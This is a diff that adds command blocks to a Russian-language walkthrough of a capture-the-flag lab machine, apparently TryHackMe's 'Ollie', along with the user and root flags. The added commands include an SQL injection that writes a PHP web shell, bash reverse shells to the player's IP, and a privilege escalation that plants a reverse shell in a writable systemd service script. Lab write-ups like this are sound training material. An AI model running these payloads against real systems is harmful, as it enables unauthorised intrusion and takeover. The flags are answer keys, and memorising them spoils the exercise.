@@ -14,9 +14,31 @@
 ### Ответьте на вопросы ниже
 Что такое флаг user.txt?
 ```commandline
+nmap -sSCV <IP>
+nc <IP> 1337
+searchsploit phpipam
+“ union select 1,2,3,’<?php system($_GET[“cmd”]); ?>’ into outfile ‘/var/www/html/rev.php’ -- -
+/bin/bash -c “bash -i >& /dev/tcp/<my_own_IP>/4444 0>&1”
+tty shell-escape
+python3 -c ‘import pty;pty.spawn(“/bin/bash”)’
+ctrl+z
+stty raw -echo; fg
+export TERM=xterm
+su ollie
+cat user.txt
+```
+```commandline
 THM{Ollie_boi_is_daH_Cut3st}
 ```
 Что такое флаг root.txt?
+```commandline
+find / -uid 1000 -perm -g=w -type f 2>/dev/null
+cat /etc/systemd/system/feedme.service
+echo '#!/bin/bash' > feedme
+echo ' /bin/bash -c "bash -i >& /dev/tcp/<my_own_IP>/5555 0>&1"' >> feedme
+nc -nvlp 5555
+cat /root/root.txt
+```
 ```commandline
 THM{Ollie_Luvs_Chicken_Fries}
 ```
